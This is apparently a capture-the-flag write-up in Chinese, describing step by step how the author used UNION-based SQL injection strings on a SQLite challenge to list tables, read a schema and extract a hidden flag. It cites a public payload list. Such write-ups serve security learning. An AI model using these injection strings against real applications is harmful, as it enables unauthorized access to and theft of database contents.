1.思考、嘗試過程
===
![image](https://hackmd.io/_uploads/BydscVRoxg.png)
- 這題根據題目描述，可以知道要使用 SQL injection 獲取隱藏在資料庫中的 flag。
- 因此我上網搜尋有關 SQL injection 的 payload，找到這個[sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) github repo，參考裡面提供的 payload 進行測試。
- 首先我使用了 
     > UNION SELECT username, password, role FROM members - - 
- 獲得了以下畫面:
    ![image](https://hackmd.io/_uploads/H15-lSRseg.png)
- 從圖片中可以確認說這題存在者SQL injecion的漏洞。
- 知道這件事後，我們就可以使用
    > UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' - 
- 獲得資料庫中的資料表:
![image](https://hackmd.io/_uploads/S1-xlBAogg.png)
- 可以從圖片中看到 secret 這個資料表，因此接下來只要去讀取這個資料表，看看裡面有什麼內容:
     > username= CYSUN' UNION SELECT sql,sql,sql FROM sqlite_master WHERE tbl_name='secrets

    ![image](https://hackmd.io/_uploads/rJR4ZrCjlg.png)
- 可以從圖片發現有 ID 和 flag 這兩個欄位，因此我嘗試去讀取 flag 這個欄位中的內容:
    > UNION SELECT flag,flag,flag FROM secrets --
- 執行完後，就發現這題的 flag 了
    ![image](https://hackmd.io/_uploads/Skx5-HColl.png)

2.參考資源
===
[sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
